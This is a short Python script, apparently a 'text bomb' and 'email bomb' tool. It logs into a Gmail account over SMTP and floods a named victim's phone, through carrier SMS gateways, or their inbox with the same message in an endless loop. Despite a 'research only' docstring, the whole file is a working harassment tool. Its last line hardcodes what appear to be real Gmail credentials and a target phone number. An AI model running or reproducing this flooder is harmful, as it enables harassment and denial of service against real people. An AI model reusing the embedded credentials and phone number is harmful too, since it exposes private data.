import smtplib as smt


def double_penetrate(username, password, command_option, carrier_option , phone_number=None,email_address=None):
    """
    FOR RESEARCH AND OR TEAM STANDY USE ONLY - You are Warned
    username: Gmail Username
    password: Gmail Password
    command_option 1. Text Bomb 2. Email Bomb
    carrier_option: User def list_carriers() to show list of carriers,
        pass value into this var for selection
    phone_number: victims number, if command_option==1 this is required
    email_address: victims email, if command_option==2 this is required
    """
    print("\n\r\n\rWelcome to Double Penetration\n\r")

    obj = smt.SMTP("smtp.gmail.com:587")
    obj.starttls()
    obj.login(username, password)

    option = command_option

    if option == 1 and phone_number != None:
        double_penetrated = 0
        carrier = carrier_option

        if carrier == 1:
            double_penetrated = "@alltelmessage.com"
        if carrier == 2:
            double_penetrated = "@txt.att.net"
        if carrier == 3:
            double_penetrated = "@pcs.rogers.com"
        if carrier == 4:
            double_penetrated = "@messaging.sprintpcs.com"
        if carrier == 5:
            double_penetrated = "@tmomail.net"
        if carrier == 6:
            double_penetrated = "@msg.telus.com"
        if carrier == 7:
            double_penetrated = "@vtext.com"
        if carrier == 8:
            double_penetrated = "@vmobl.com"
        if carrier == 9:
            double_penetrated = "@sms.orange.pl"

        v_phone = str(phone_number) + double_penetrated
        message = input("Message: ")
        phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
                         % (username, "".join(v_phone), "".join(message)))

        while 1:
            obj.sendmail(username, v_phone, phone_message)
            print ("Penetrating -> Control-C to SIGKILL")

    elif option == 2 and email_address != None:
        v_email = email_address
        message = input("Message: ")
        email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
                         % (username, "".join(v_email), "".join(message)))

        while 1:
            obj.sendmail(username, v_email, email_message)
            print ("Penetrating -> Control-C to SIGKILL")
    else:
        print('Failed to penetrate through phone or email\n')
        print('Please check input *args and *kwargs to DP function')

double_penetrate('indianvip260', '1870house', 1, 7, '6504636049')
def list_carriers():
    print("What is their carrier? \n"
          "1. Alltel \n"
          "2. AT&T \n"
          "3. Rogers \n"
          "4. Sprint \n"
          "5. T-Mobile \n"
          "6. Telus \n"
          "7. Verizon"
          "8. Virgin Mobile \n"
          "9. Orange \n"
          "Pass Number Into DP Function"
          " \n\r ")

list_carriers()
